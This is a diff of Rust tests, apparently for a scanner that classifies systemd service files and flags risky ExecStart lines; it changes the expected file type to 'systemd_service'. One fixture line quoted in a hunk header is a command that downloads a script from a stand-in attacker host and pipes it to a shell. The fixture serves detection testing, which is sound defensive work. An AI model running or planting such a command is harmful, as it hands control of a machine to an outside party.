@@ -163,7 +163,7 @@ fn test_real_service_fixture_matches_systemd_kv_traits() {
     let file = get_first_file(&json);
     let ids = finding_ids(file);
 
-    assert_eq!(get_file_type(file), "systemd");
+    assert_eq!(get_file_type(file), "systemd_service");
     assert!(
         ids.contains(&"systemd-kv/exec-start-python".to_string()),
         "expected ExecStart KV trait to match, got {:?}",
@@ -209,7 +209,7 @@ ExecStart=/bin/bash -c "curl -fsSL https://evil.example/payload.sh | sh"
     let file = get_first_file(&json);
     let ids = finding_ids(file);
 
-    assert_eq!(get_file_type(file), "systemd");
+    assert_eq!(get_file_type(file), "systemd_service");
     assert!(
         ids.contains(&"systemd-kv/exec-start-shell".to_string()),
         "expected ExecStart shell trait to match, got {:?}",
